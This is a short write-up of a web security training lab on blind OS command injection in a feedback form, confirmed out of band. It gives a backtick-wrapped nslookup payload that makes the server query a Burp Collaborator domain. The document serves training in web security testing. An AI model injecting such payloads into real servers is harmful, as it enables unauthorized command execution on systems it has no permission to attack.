# Blind OS Command Injection — Out-of-Band Interaction

This exercise again targets a blind OS command injection flaw in the feedback feature.

User input flows into a shell command executed by the server, but this time the command runs asynchronously, meaning the app's response is unaffected by it. There's also no way to redirect its output somewhere accessible. Instead, the only way to confirm execution is through an out-of-band channel — triggering a network interaction with an external host.

**Goal:** Use the blind injection to make the server perform a DNS lookup against a Burp Collaborator address.

Note: The Academy's firewall stops the lab environment from reaching arbitrary external systems, so Burp Collaborator's own public server must be used for this to work.

---

**References:**
- https://portswigger.net/web-security/os-command-injection
- https://book.hacktricks.xyz/pentesting-web/command-injection

pic 1

---

The feedback form again:

pic 2

The payload that triggers the injection here:

```
`nslookup 7s0qd0oqa0r71b9pewc0nu7a41asynmc.oastify.com`
```

pic 3

pic 4
